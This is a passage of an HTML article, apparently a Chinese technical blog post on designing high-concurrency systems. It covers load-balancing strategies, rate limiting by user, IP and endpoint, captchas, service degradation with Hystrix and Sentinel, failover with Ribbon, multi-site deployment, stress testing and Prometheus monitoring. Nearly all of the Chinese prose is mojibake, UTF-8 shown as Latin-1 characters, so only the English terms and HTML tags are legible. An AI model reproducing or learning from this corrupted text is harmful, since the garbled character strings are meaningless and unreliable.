<li><code>è½®è¯¢</code>ï¼šæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„æœåŠ¡å™¨èŠ‚ç‚¹ï¼Œå¦‚æœæœåŠ¡å™¨èŠ‚ç‚¹downæ‰ï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚</li>
<li><code>weightæƒé‡</code>ï¼šweightä»£è¡¨æƒé‡é»˜è®¤ä¸º1ï¼Œæƒé‡è¶Šé«˜ï¼ŒæœåŠ¡å™¨èŠ‚ç‚¹è¢«åˆ†é…åˆ°çš„æ¦‚ç‡è¶Šå¤§ã€‚weightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œç”¨äºæœåŠ¡å™¨èŠ‚ç‚¹æ€§èƒ½ä¸å‡çš„æƒ…å†µã€‚</li>
<li><code>ip hash</code>ï¼šæ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®ipçš„hashç»“æœåˆ†é…, è¿™æ ·æ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®åŒä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œå®ƒæ˜¯è§£è¯€Sessionå…±äº«çš„é—®é¢˜çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚</li>
<li><code>æœ€å°‘è¿æ¥æ•°</code>ï¼šæŠŠè¯·æ±‚è½¬å‘ç»™è¿æ¥æ•°è¾ƒå°‘çš„æœåŠ¡å™¨èŠ‚ç‚¹ã€‚è½®è¯¢ç®—æ³•æ˜¯æŠŠè¯·æ±‚å¹³å‡çš„è½¬å‘ç»™å„ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œä½¿å®ƒä»¬çš„è´Ÿè½½å¤§è‡´ç›¸åŒï¼›ä½†æœ‰äº›è¯·æ±‚å ç”¨çš„æ—¶é—´å¾ˆé•¿ï¼Œä¼šå¯¼è‡´å…¶æ‰€åœ¨çš„æœåŠ¡å™¨èŠ‚ç‚¹è´Ÿè½½è¾ƒé«˜ã€‚è¿™æ—¶least_connæ–¹å¼å°±å¯ä»¥è¾¾åˆ°æ›´å¥½çš„è´Ÿè½½å‡è¡¡æ•ˆæœã€‚</li>
<li><code>æœ€çŸ­å“åº”æ—¶é—´</code>ï¼šæŒ‰æœåŠ¡å™¨èŠ‚ç‚¹çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„æœåŠ¡å™¨èŠ‚ç‚¹ä¼˜å…ˆè¢«åˆ†é…ã€‚</li>
</ol>
<p>å½“ç„¶è¿˜æœ‰å…¶ä»–çš„ç­–ç•¥ï¼Œåœ¨è¿™é‡Œå°±ä¸ç»™å¤§å®¶ä¸€ä¸€ä»‹ç»äº†ã€‚</p>
<h2 data-id="heading-15">13 é™æµ</h2>
<p>å¯¹äºé«˜å¹¶å‘ç³»ç»Ÿï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéœ€è¦å¯¹ç”¨æˆ·çš„è¯·æ±‚é‡åš<code>é™æµ</code>ã€‚</p>
<p>ç‰¹åˆ«æ˜¯ç§’æ€ç³»ç»Ÿä¸­ï¼Œå¦‚æœä¸åšä»»ä½•é™åˆ¶ï¼Œç»å¤§éƒ¨åˆ†å•†å“å¯èƒ½æ˜¯è¢«æœºå™¨æŠ¢åˆ°ï¼Œè€Œéæ­£å¸¸çš„ç”¨æˆ·ï¼Œæœ‰ç‚¹ä¸å¤ªå…¬å¹³ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æœ‰å¿…è¦è¯†åˆ«è¿™äº›éæ³•è¯·æ±‚ï¼Œåšä¸€äº›é™åˆ¶ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•ç°åœ¨è¿™äº›éæ³•è¯·æ±‚å‘¢ï¼Ÿ</p>
<p>ç›®å‰æœ‰ä¸¤ç§å¸¸ç”¨çš„é™æµæ–¹å¼ï¼š</p>
<ul>
<li>åŸºäºnginxé™æµ</li>
<li>åŸºäºredisé™æµ</li>
</ul>
<h3 data-id="heading-16">13.1 å¯¹åŒä¸€ç”¨æˆ·é™æµ</h3>
<p>ä¸ºäº†é˜²æ­¢æŸä¸ªç”¨æˆ·ï¼Œè¯·æ±‚æ¥å£æ¬¡æ•°è¿‡äºé¢‘ç¹ï¼Œå¯ä»¥åªé’ˆå¯¹è¯¥ç”¨æˆ·åšé™åˆ¶ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8025c82acaa447218ba4e5082ff7ac85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=Oe4hNkjeMa%2FXUCn0PH0c1bC%2B6mg%3D" alt="" loading="lazy"/>
é™åˆ¶åŒä¸€ä¸ªç”¨æˆ·idï¼Œæ¯”å¦‚æ¯åˆ†é’Ÿåªèƒ½è¯·æ±‚5æ¬¡æ¥å£ã€‚</p>
<h3 data-id="heading-17">13.2 å¯¹åŒä¸€ipé™æµ</h3>
<p>æœ‰æ—¶å€™åªå¯¹æŸä¸ªç”¨æˆ·é™æµæ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰äº›é«˜æ‰‹å¯ä»¥æ¨¡æ‹Ÿå¤šä¸ªç”¨æˆ·è¯·æ±‚ï¼Œè¿™ç§nginxå°±æ²¡æ³•è¯†åˆ«äº†ã€‚</p>
<p>è¿™æ—¶éœ€è¦åŠ åŒä¸€ipé™æµåŠŸèƒ½ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35fb1769086a4bf4a47d1ecaa24092e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=CglW76T2%2FPGlSCI5OAqYO0NI9oc%3D" alt="" loading="lazy"/>
é™åˆ¶åŒä¸€ä¸ªipï¼Œæ¯”å¦‚æ¯åˆ†é’Ÿåªèƒ½è¯·æ±‚5æ¬¡æ¥å£ã€‚</p>
<p>ä½†è¿™ç§é™æµæ–¹å¼å¯èƒ½ä¼šæœ‰è¯¯æ€çš„æƒ…å†µï¼Œæ¯”å¦‚åŒä¸€ä¸ªå…¬å¸æˆ–ç½‘å§çš„å‡ºå£ipæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœé‡Œé¢æœ‰å¤šä¸ªæ­£å¸¸ç”¨æˆ·åŒæ—¶å‘èµ·è¯·æ±‚ï¼Œæœ‰äº›ç”¨æˆ·å¯èƒ½ä¼šè¢«é™åˆ¶ä½ã€‚</p>
<h3 data-id="heading-18">13.3 å¯¹æ¥å£é™æµ</h3>
<p>åˆ«ä»¥ä¸ºé™åˆ¶äº†ç”¨æˆ·å’Œipå°±ä¸‡äº‹å¤§å‰ï¼Œæœ‰äº›é«˜æ‰‹ç”šè‡³å¯ä»¥ä½¿ç”¨ä»£ç†ï¼Œæ¯æ¬¡éƒ½è¯·æ±‚éƒ½æ¢ä¸€ä¸ªipã€‚</p>
<p>è¿™æ—¶å¯ä»¥é™åˆ¶è¯·æ±‚çš„æ¥å£æ€»æ¬¡æ•°ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67e39f294d9c4a2db4afb6777a973187~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=nl%2BiaoAn%2BYfhuAmi6WfgFaNkUYs%3D" alt="" loading="lazy"/>
åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œè¿™ç§é™åˆ¶å¯¹äºç³»ç»Ÿçš„ç¨³å®šæ€§æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚ä½†å¯èƒ½ç”±äºæœ‰äº›éæ³•è¯·æ±‚æ¬¡æ•°å¤ªå¤šï¼Œè¾¾åˆ°äº†è¯¥æ¥å£çš„è¯·æ±‚ä¸Šé™ï¼Œè€Œå½±å“å…¶ä»–çš„æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥æ¥å£ã€‚çœ‹èµ·æ¥æœ‰ç‚¹å¾—ä¸å¿å¤±ã€‚</p>
<h3 data-id="heading-19">13.4 åŠ éªŒè¯ç </h3>
<p>ç›¸å¯¹äºä¸Šé¢ä¸‰ç§æ–¹å¼ï¼ŒåŠ éªŒè¯ç çš„æ–¹å¼å¯èƒ½æ›´ç²¾å‡†ä¸€äº›ï¼ŒåŒæ ·èƒ½é™åˆ¶ç”¨æˆ·çš„è®¿é—®é¢‘æ¬¡ï¼Œä½†å¥½å¤„æ˜¯ä¸ä¼šå­˜åœ¨è¯¯æ€çš„æƒ…å†µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbb83f986fed496189bb0b18c9e5a09d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=7s5MpOKkgYSzRO5XHNPNJl03C88%3D" alt="" loading="lazy"/>
é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·åœ¨è¯·æ±‚ä¹‹å‰ï¼Œéœ€è¦å…ˆè¾“å…¥éªŒè¯ç ã€‚ç”¨æˆ·å‘èµ·è¯·æ±‚ä¹‹åï¼ŒæœåŠ¡ç«¯ä¼šå»æ ¡éªŒè¯¥éªŒè¯ç æ˜¯å¦æ­£ç¡®ã€‚åªæœ‰æ­£ç¡®æ‰å…è®¸è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œå¦åˆ™ç›´æ¥è¿”å›ï¼Œå¹¶ä¸”æç¤ºéªŒè¯ç é”™è¯¯ã€‚</p>
<p>æ­¤å¤–ï¼ŒéªŒè¯ç ä¸€èˆ¬æ˜¯ä¸€æ¬¡æ€§çš„ï¼ŒåŒä¸€ä¸ªéªŒè¯ç åªå…è®¸ä½¿ç”¨ä¸€æ¬¡ï¼Œä¸å…è®¸é‡å¤ä½¿ç”¨ã€‚</p>
<p>æ™®é€šéªŒè¯ç ï¼Œç”±äºç”Ÿæˆçš„æ•°å­—æˆ–è€…å›¾æ¡ˆæ¯”è¾ƒç®€å•ï¼Œå¯èƒ½ä¼šè¢«ç ´è§£ã€‚ä¼˜ç‚¹æ˜¯ç”Ÿæˆé€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œç¼ºç‚¹æ˜¯æœ‰å®‰å…¨éšæ‚£ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªéªŒè¯ç å«åšï¼š<code>ç§»åŠ¨æ»‘å—</code>ï¼Œå®ƒç”Ÿæˆé€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œä½†æ¯”è¾ƒå®‰å…¨ï¼Œæ˜¯ç›®å‰å„å¤§äº’è”ç½‘å…¬å¸çš„é¦–é€‰ã€‚</p>
<h2 data-id="heading-20">14 æœåŠ¡é™çº§</h2>
<p>å‰é¢å·²ç»è¯´è¿‡ï¼Œå¯¹äºé«˜å¹¶å‘ç³»ç»Ÿï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéœ€è¦åšé™æµã€‚</p>
<p>ä½†å…‰åšé™æµè¿˜ä¸å¤Ÿã€‚</p>
<p>æˆ‘ä»¬éœ€è¦åˆç†åˆ©ç”¨æœåŠ¡å™¨èµ„æºï¼Œä¿ç•™æ ¸å¿ƒçš„åŠŸèƒ½ï¼Œå°†éƒ¨åˆ†éæ ¸å¿ƒçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å±è”½æˆ–è€…ä¸‹çº¿æ‰ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦åš<code>æœåŠ¡é™çº§</code>ã€‚</p>
<p>æˆ‘ä»¬åœ¨è®¾è®¡é«˜å¹¶å‘ç³»ç»Ÿæ—¶ï¼Œå¯ä»¥é¢„ç•™ä¸€äº›æœåŠ¡é™çº§çš„å¼€å…³ã€‚</p>
<p>æ¯”å¦‚åœ¨ç§’æ€ç³»ç»Ÿä¸­ï¼Œæ ¸å¿ƒçš„åŠŸèƒ½æ˜¯å•†å“çš„ç§’æ€ï¼Œå¯¹äºå•†å“çš„è¯„è®ºåŠŸèƒ½ï¼Œå¯ä»¥æš‚æ—¶å±è”½æ‰ã€‚</p>
<p>åœ¨æœåŠ¡ç«¯çš„åˆ†å¸ƒå¼é…ç½®ä¸­å¿ƒï¼Œæ¯”å¦‚ï¼šapolloä¸­ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªå¼€å…³ï¼Œé…ç½®æ˜¯å¦å±•ç¤ºè¯„è®ºåŠŸèƒ½ï¼Œé»˜è®¤æ˜¯trueã€‚</p>
<p>å‰ç«¯é¡µé¢é€šè¿‡æœåŠ¡å™¨çš„æ¥å£ï¼Œè·å–åˆ°è¯¥é…ç½®å‚æ•°ã€‚</p>
<p>å¦‚æœéœ€è¦æš‚æ—¶å±è”½å•†å“è¯„è®ºåŠŸèƒ½ï¼Œå¯ä»¥å°†apolloä¸­çš„å‚æ•°è®¾ç½®æˆfalseã€‚</p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬åœ¨è®¾è®¡é«˜å¹¶å‘ç³»ç»Ÿæ—¶ï¼Œè¿˜å¯ä»¥é¢„ç•™ä¸€äº›å…œåº•æ–¹æ¡ˆã€‚</p>
<p>æ¯”å¦‚æŸä¸ªåˆ†ç±»æŸ¥è¯¢æ¥å£ï¼Œè¦ä»redisä¸­è·å–åˆ†ç±»æ•°æ®ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚ä½†å¦‚æœé‚£ä¸€æ¡redisæŒ‚äº†ï¼Œåˆ™æŸ¥è¯¢æ•°æ®å¤±è´¥ã€‚</p>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å¢åŠ ä¸€ä¸ªå…œåº•æ–¹æ¡ˆã€‚</p>
<p>å¦‚æœä»redisä¸­è·å–ä¸åˆ°æ•°æ®ï¼Œåˆ™ä»apolloä¸­è·å–ä¸€ä»½é»˜è®¤çš„åˆ†ç±»æ•°æ®ã€‚</p>
<p>ç›®å‰ä½¿ç”¨è¾ƒå¤šçš„ç†”æ–­é™çº§ä¸­é—´ä»¶æ˜¯ï¼š<code>Hystrix</code> å’Œ <code>Sentinel</code>ã€‚</p>
<ul>
<li>Hystrixæ˜¯Netflixå¼€æºçš„ç†”æ–­é™çº§ç»„ä»¶ã€‚</li>
<li>Sentinelæ˜¯é˜¿é‡Œä¸­é—´ä»¶å›¢é˜Ÿå¼€æºçš„ä¸€æ¬¾ä¸å…‰å…·æœ‰ç†”æ–­é™çº§åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜æ”¯æŒç³»ç»Ÿè´Ÿè½½ä¿æŠ¤çš„ç»„ä»¶ã€‚</li>
</ul>
<p>äºŒè€…çš„åŒºåˆ«å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbb07cc10a2c4d3eb21f81f93dad0cad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=cURddcp4xRvln6JjDjniNXxrno4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-21">15 æ•…éšœè½¬ç§»</h2>
<p>åœ¨é«˜å¹¶å‘çš„ç³»ç»Ÿå½“ä¸­ï¼ŒåŒä¸€æ—¶é—´æœ‰å¤§é‡çš„ç”¨æˆ·è®¿é—®ç³»ç»Ÿã€‚</p>
<p>å¦‚æœæŸä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨èŠ‚ç‚¹å¤„äºå‡æ­»çŠ¶æ€ï¼Œæ¯”å¦‚CPUä½¿ç”¨ç‡100%äº†ï¼Œç”¨æˆ·çš„è¯·æ±‚æ²¡åŠæ³•åŠæ—¶å¤„ç†ï¼Œå¯¼è‡´å¤§é‡ç”¨æˆ·å‡ºç°è¯·æ±‚è¶…æ—¶çš„æƒ…å†µã€‚</p>
<p>å¦‚æœè¿™ç§æƒ…å†µä¸‹ï¼Œä¸åšä»»ä½•å¤„ç†ï¼Œå¯èƒ½ä¼šå½±å“ç³»ç»Ÿä¸­éƒ¨åˆ†ç”¨æˆ·çš„æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>è¿™æ—¶æˆ‘ä»¬éœ€è¦å»ºç«‹<code>æ•…éšœè½¬ç§»</code>æœºåˆ¶ã€‚</p>
<p>å½“æ£€æµ‹åˆ°ç»å¸¸æ¥å£è¶…æ—¶ï¼Œæˆ–è€…CPUæ‰“æ»¡ï¼Œæˆ–è€…å†…å­˜æº¢å‡ºçš„æƒ…å†µï¼Œèƒ½å¤Ÿè‡ªåŠ¨é‡å¯é‚£å°æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šçš„åº”ç”¨ã€‚</p>
<p>åœ¨SpringCloudå¾®æœåŠ¡å½“ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>Ribbon</code>åšè´Ÿè½½å‡è¡¡å™¨ã€‚</p>
<p>Ribbonæ˜¯Spring Cloudä¸­çš„ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨ç»„ä»¶ï¼Œå®ƒå¯ä»¥æ£€æµ‹æœåŠ¡çš„å¯ç”¨æ€§ï¼Œå¹¶æ ¹æ®ä¸€å®šè§„åˆ™å°†è¯·æ±‚åˆ†å‘è‡³ä¸åŒçš„æœåŠ¡èŠ‚ç‚¹ã€‚åœ¨ä½¿ç”¨Ribbonæ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li>è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼Œå½“è¯·æ±‚è¶…æ—¶æ—¶ï¼ŒRibbonä¼šè‡ªåŠ¨å°†è¯·æ±‚è½¬å‘åˆ°å…¶ä»–å¯ç”¨çš„æœåŠ¡ä¸Šã€‚</li>
<li>è®¾ç½®æœåŠ¡çš„å¥åº·æ£€æŸ¥ï¼ŒRibbonä¼šè‡ªåŠ¨æ£€æµ‹æœåŠ¡çš„å¯ç”¨æ€§ï¼Œå¹¶å°†è¯·æ±‚è½¬å‘è‡³å¯ç”¨çš„æœåŠ¡ä¸Šã€‚</li>
</ol>
<p>æ­¤å¤–ï¼Œè¿˜éœ€è¦ä½¿ç”¨<code>Hystrix</code>åšç†”æ–­å¤„ç†ã€‚</p>
<p>Hystrixæ˜¯SpringCloudä¸­çš„ä¸€ä¸ªç†”æ–­å™¨ç»„ä»¶ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨åœ°ç›‘æµ‹æ‰€æœ‰é€šè¿‡å®ƒè°ƒç”¨çš„æœåŠ¡ï¼Œå¹¶åœ¨æœåŠ¡å‡ºç°æ•…éšœæ—¶è‡ªåŠ¨åˆ‡æ¢åˆ°å¤‡ç”¨æœåŠ¡ã€‚åœ¨ä½¿ç”¨Hystrixæ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li>è®¾ç½®æ–­è·¯å™¨çš„é˜ˆå€¼ï¼Œå½“æ•…éšœç‡è¶…è¿‡ä¸€å®šé˜ˆå€¼åï¼Œæ–­è·¯å™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°å¤‡ç”¨æœåŠ¡ä¸Šã€‚</li>
<li>è®¾ç½®æœåŠ¡çš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœæœåŠ¡åœ¨æŒ‡å®šçš„æ—¶é—´å†…æ— æ³•è¿”å›ç»“æœï¼Œæ–­è·¯å™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°å¤‡ç”¨æœåŠ¡ä¸Šã€‚åˆ°å…¶ä»–çš„èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨çš„æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šã€‚</li>
</ol>
<h2 data-id="heading-22">16 å¼‚åœ°å¤šæ´»</h2>
<p>æœ‰äº›é«˜å¹¶å‘ç³»ç»Ÿï¼Œä¸ºäº†ä¿è¯ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œä¸åªéƒ¨ç½²åœ¨ä¸€ä¸ªæœºæˆ¿å½“ä¸­ã€‚</p>
<p>ä¸ºäº†é˜²æ­¢æœºæˆ¿æ–­ç”µï¼Œæˆ–è€…æŸäº›ä¸å¯é€†çš„å› ç´ ï¼Œæ¯”å¦‚ï¼šå‘ç”Ÿåœ°éœ‡ï¼Œå¯¼è‡´æœºæˆ¿æŒ‚äº†ã€‚</p>
<p>éœ€è¦æŠŠç³»ç»Ÿéƒ¨ç½²åˆ°å¤šä¸ªæœºæˆ¿ã€‚</p>
<p>æˆ‘ä»¬ä¹‹å‰çš„æ¸¸æˆç™»å½•ç³»ç»Ÿï¼Œå°±éƒ¨ç½²åˆ°äº†æ·±åœ³ã€å¤©æ´¥å’Œæˆéƒ½ï¼Œè¿™ä¸‰ä¸ªæœºæˆ¿ã€‚</p>
<p>è¿™ä¸‰ä¸ªæœºæˆ¿éƒ½æœ‰ç”¨æˆ·çš„æµé‡ï¼Œå…¶ä¸­æ·±åœ³æœºæˆ¿å äº†40%ï¼Œå¤©æ´¥æœºæˆ¿å äº†30%ï¼Œæˆéƒ½æœºæˆ¿å äº†30%ã€‚</p>
<p>å¦‚æœå…¶ä¸­çš„æŸä¸ªæœºæˆ¿çªç„¶æŒ‚äº†ï¼Œæµé‡ä¼šè¢«è‡ªåŠ¨åˆ†é…åˆ°å¦å¤–ä¸¤ä¸ªæœºæˆ¿å½“ä¸­ï¼Œä¸ä¼šå½±å“ç”¨æˆ·çš„æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>è¿™å°±éœ€è¦ä½¿ç”¨<code>å¼‚åœ°å¤šæ´»</code>æ¶æ„äº†ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29cd6621cdcf4308942f1d86dad27c95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=GKaVZV5xjuHCzPSOOdY1nvDOHNg%3D" alt="" loading="lazy"/>
ç”¨æˆ·è¯·æ±‚å…ˆç»è¿‡ç¬¬ä¸‰æ–¹çš„DNSæœåŠ¡å™¨è§£æï¼Œç„¶åè¯¥ç”¨æˆ·è¯·æ±‚åˆ°è¾¾è·¯ç”±æœåŠ¡å™¨ï¼Œéƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸Šã€‚</p>
<p>è·¯ç”±æœåŠ¡å™¨ï¼Œæ ¹æ®ä¸€å®šçš„ç®—æ³•ï¼Œä¼šå°†è¯¥ç”¨æˆ·è¯·æ±‚åˆ†é…åˆ°å…·ä½“çš„æœºæˆ¿ã€‚</p>
<p>å¼‚åœ°å¤šæ´»çš„éš¾åº¦æ˜¯å¤šä¸ªæœºæˆ¿éœ€è¦åšæ•°æ®åŒæ­¥ï¼Œå¦‚ä½•ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ï¼Ÿ</p>
<h2 data-id="heading-23">17 å‹æµ‹</h2>
<p>é«˜å¹¶å‘ç³»ç»Ÿï¼Œåœ¨ä¸Šçº¿ä¹‹å‰ï¼Œå¿…é¡»è¦åšçš„ä¸€ä»¶äº‹æ˜¯åš<code>å‹åŠ›æµ‹è¯•</code>ã€‚</p>
<p>æˆ‘ä»¬å…ˆè¦é¢„ä¼°ä¸€ä¸‹ç”Ÿäº§ç¯å¢ƒçš„è¯·æ±‚é‡ï¼Œç„¶åå¯¹ç³»ç»Ÿåšå‹åŠ›æµ‹è¯•ï¼Œä¹‹åè¯„ä¼°ç³»ç»Ÿéœ€è¦éƒ¨ç½²å¤šå°‘ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>æ¯”å¦‚é¢„ä¼°æœ‰10000çš„qpsï¼Œä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹æœ€å¤§æ”¯æŒ1000pqsï¼Œè¿™æ ·æˆ‘ä»¬éœ€è¦éƒ¨ç½²10ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>ä½†å‡å¦‚åªéƒ¨ç½²10ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ï¼Œä¸‡ä¸€çªå¢äº†ä¸€äº›æ–°çš„ç”¨æˆ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šæ‰›ä¸ä½å‹åŠ›ã€‚</p>
<p>å› æ­¤ï¼Œéƒ¨ç½²çš„æœåŠ¡å™¨èŠ‚ç‚¹ï¼Œéœ€è¦æŠŠé¢„ä¼°ç”¨æˆ·è¯·æ±‚é‡çš„å¤šä¸€äº›ï¼Œæ¯”å¦‚ï¼šæŒ‰3å€çš„ç”¨æˆ·è¯·æ±‚é‡æ¥è®¡ç®—ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬éœ€è¦éƒ¨ç½²30ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>å‹åŠ›æµ‹è¯•çš„ç»“æœè·Ÿç¯å¢ƒæœ‰å…³ï¼Œåœ¨devç¯å¢ƒæˆ–è€…testç¯å¢ƒï¼Œåªèƒ½å‹æµ‹ä¸€ä¸ªå¤§æ¦‚çš„è¶‹åŠ¿ã€‚</p>
<p>æƒ³è¦æ›´çœŸå®çš„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦åœ¨preç¯å¢ƒï¼Œæˆ–è€…è·Ÿç”Ÿäº§ç¯å¢ƒç›¸åŒé…ç½®çš„ä¸“é—¨çš„å‹æµ‹ç¯å¢ƒä¸­ï¼Œè¿›è¡Œå‹åŠ›æµ‹è¯•ã€‚</p>
<p>ç›®å‰å¸‚é¢ä¸Šåšå‹åŠ›æµ‹è¯•çš„å·¥å…·æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¼€æºçš„æœ‰ï¼šJemterã€LoaderRunnderã€Locustç­‰ç­‰ã€‚</p>
<p>æ”¶è´¹çš„æœ‰ï¼šé˜¿é‡Œè‡ªç ”çš„äº‘å‹æµ‹å·¥å…·PTSã€‚</p>
<h2 data-id="heading-24">18 ç›‘æ§</h2>
<p>ä¸ºäº†å‡ºç°ç³»ç»Ÿæˆ–è€…SQLé—®é¢˜æ—¶ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬åŠæ—¶å‘ç°ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç³»ç»Ÿåšç›‘æ§ã€‚</p>
<p>ç›®å‰ä¸šç•Œä½¿ç”¨æ¯”è¾ƒå¤šçš„å¼€æºç›‘æ§ç³»ç»Ÿæ˜¯ï¼š<code>Prometheus</code>ã€‚</p>
<p>å®ƒæä¾›äº† <code>ç›‘æ§</code> å’Œ <code>é¢„è­¦</code> çš„åŠŸèƒ½ã€‚</p>
<p>æ¶æ„å›¾å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20b28d2952bc46b991dcbd729367bc77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=uK5xST77%2BjWsqs%2F1XyNmPurRfl0%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨å®ƒç›‘æ§å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>æ¥å£å“åº”æ—¶é—´</li>
<li>è°ƒç”¨ç¬¬ä¸‰æ–¹æœåŠ¡è€—æ—¶</li>
<li>æ…¢æŸ¥è¯¢sqlè€—æ—¶</li>
<li>cpuä½¿ç”¨æƒ…å†µ</li>
<li>å†…å­˜ä½¿ç”¨æƒ…å†µ</li>
<li>ç£ç›˜ä½¿ç”¨æƒ…å†µ</li>
<li>æ•°æ®åº“ä½¿ç”¨æƒ…å†µ</li>
</ul>
<p>ç­‰ç­‰ã€‚ã€‚ã€‚</p>
<p>å®ƒçš„ç•Œé¢å¤§æ¦‚é•¿è¿™æ ·å­ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e97451b35c524e19aa96568a66ee17c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=va3BvgRtpspk6XGg78NjJ6O1%2Fs8%3D" alt="" loading="lazy"/>
